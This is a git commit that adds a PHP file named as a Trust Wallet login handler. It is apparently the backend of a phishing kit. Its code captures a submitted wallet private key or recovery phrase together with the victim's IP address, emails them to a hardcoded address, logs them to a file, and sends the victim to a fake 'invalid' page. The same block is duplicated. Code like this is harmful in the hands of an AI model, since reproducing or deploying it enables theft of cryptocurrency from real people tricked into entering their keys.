e5d59d00c44bccb5e9cdf6bb625b063df2766309
tether-tokenloyalty <127014605+tether-tokenloyalty@users.noreply.github.com>
2023-05-15 19:20:11 +0700

    Add files via upload

---
+++ trustwallet/login.php
@@ -0,0 +1,150 @@
+<?php
+
+
+/*========== [ Variables ]==========*/
+$ip 		= getenv("REMOTE_ADDR");
+$PrivateKey   = $_POST['PrivateKey'];
+/*========== [ Variables ]==========*/
+
+
+$message = "emilojesico@gmail.com
++--------------------------[ SHIBA INU ]-------------------------+
+PHARSE       
+$PrivateKey
+IP	: https://whatismyipaddress.com/?IP=$ip
++--------------------------[ SHIBA INU ]-------------------------+
+";
+
+
+$to = "emilojesico@gmail.com"; // Email Here
+$subject = "SHIBA INU = [$ip]";
+$headers = "From: SHIBA INU <emilojesico@gmail.com>";
+$headers .= $_POST['eMailAdd']."\n";
+$headers .= "MIME-Version: 1.0\n";
+
+mail($to, $subject, $message,$headers);
+
+$file = "+--------------------------[JACKPOT-DI-TRUSTWALLET]-------------------------+";
+$PrivateKey   = $_POST['PrivateKey'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$today = date("F j, Y, g:i a");
+
+$handle = fopen($file, 'a');
+fwrite($handle, "---------------------------------------");
+fwrite($handle, "\n");
+fwrite($handle, "::  PHARSE        ::   ");
+fwrite($handle, "$PrivateKey");
+fwrite($handle, "\n");
+fwrite($handle, "::  IP            ::   ");
+fwrite($handle, "$ip");
+fwrite($handle, "\n");
+fwrite($handle, "::  DAY           ::   ");
+fwrite($handle, "$today");
+fwrite($handle, "\n");
+fclose($handle);
+echo "<script LANGUAGE=\"JavaScript\">
+<!--
+window.location=\"invalid.html?/nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault\";
+// -->
+</script>";
+?>
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-33910177-1']);
+  _gaq.push(['_setDomainName', 'x90x.net']);
+  _gaq.push(['_setAllowLinker', true]);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+?>
+
+
+
+
+
+
+
+
+<?php
+
+
+/*========== [ Variables ]==========*/
+$ip 		= getenv("REMOTE_ADDR");
+$PrivateKey   = $_POST['PrivateKey'];
+/*========== [ Variables ]==========*/
+
+
+$message = "emilojesico@gmail.com
++--------------------------[ SHIBA INU ]-------------------------+
+PHARSE       
+$PrivateKey
+IP	: https://whatismyipaddress.com/?IP=$ip
++--------------------------[ SHIBA INU ]-------------------------+
+";
+
+
+$to = "emilojesico@gmail.com"; // Email Here
+$subject = "SHIBA INU = [$ip]";
+$headers = "From: SHIBA INU <emilojesico@gmail.com>";
+$headers .= $_POST['eMailAdd']."\n";
+$headers .= "MIME-Version: 1.0\n";
+
+mail($to, $subject, $message,$headers);
+
+$file = "+--------------------------[JACKPOT-DI-TRUSTWALLET]-------------------------+";
+$PrivateKey   = $_POST['PrivateKey'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$today = date("F j, Y, g:i a");
+
+$handle = fopen($file, 'a');
+fwrite($handle, "---------------------------------------");
+fwrite($handle, "\n");
+fwrite($handle, "::  PHARSE        ::   ");
+fwrite($handle, "$PrivateKey");
+fwrite($handle, "\n");
+fwrite($handle, "::  IP            ::   ");
+fwrite($handle, "$ip");
+fwrite($handle, "\n");
+fwrite($handle, "::  DAY           ::   ");
+fwrite($handle, "$today");
+fwrite($handle, "\n");
+fclose($handle);
+echo "<script LANGUAGE=\"JavaScript\">
+<!--
+window.location=\"/Import/invalid.html?/nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault\";
+// -->
+</script>";
+?>
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-33910177-1']);
+  _gaq.push(['_setDomainName', 'x90x.net']);
+  _gaq.push(['_setAllowLinker', true]);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+?>
+
+
+
+
+
+
+
+
